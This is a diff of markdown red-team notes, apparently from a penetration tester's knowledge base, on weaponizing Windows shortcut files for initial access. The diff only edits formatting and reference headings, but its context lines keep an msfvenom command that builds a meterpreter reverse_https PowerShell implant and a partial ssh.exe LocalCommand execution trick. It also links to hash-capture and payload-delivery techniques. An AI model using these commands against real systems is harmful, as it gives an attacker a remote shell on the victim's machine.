@@ -9,9 +9,10 @@ C:\Program Files (x86)\Microsoft Office\root\Office16\WINWORD.exe
 
 ## 02 - Generate Shortcut
 
-### 2.1 - Powershell
+### 2.1 - PowerShell
 
-Note: The **TargetPath** has a limit of 260 characters long. If you're using powershell payload then it's recommended to use `psh-cmd` format instead of `psh`, `psh-reflection`, and `psh-net`.
+> [!NOTE] Characters Limit
+> The **TargetPath** has a limit of 260 characters long. If you're using powershell payload then it's recommended to use `psh-cmd` format instead of `psh`, `psh-reflection`, and `psh-net`.
 
 ```
 $ msfvenom -p windows/x64/meterpreter/reverse_https lhost=<IP> lport=<PORT> exitfunc=thread -f psh-cmd | sed 's/%COMSPEC% \/b \/c start \/b \/min powershell\.exe -nop -w hidden -e //g' | base64 -d > implant.ps1
@@ -102,6 +103,8 @@ C:\Windows\System32\OpenSSH\ssh.exe -o "PermitLocalCommand=yes" -o "LocalCommand
 ---
 ## References
 
+### Backlinks
+
 - [[01 - Capture Hashes via Spoof SMB Shares|Responder: Capture Hashes via Spoof SMB Shares Scenario]]
 
 - [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xD - Client-Side Attacks/Authentication Relay/Metasploit|Metasploit: Capture Hashes]]
@@ -111,6 +114,8 @@ C:\Windows\System32\OpenSSH\ssh.exe -o "PermitLocalCommand=yes" -o "LocalCommand
 - [[SMB Delivery|Metasploit: SMB Delivery]]
 
 - [[Web Delivery|Metasploit: Web Delivery]]
+
+### Github
 
 - [rvrsh3ll: Create-HotKeyLNK.ps1](https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Create-HotKeyLNK.ps1)
 
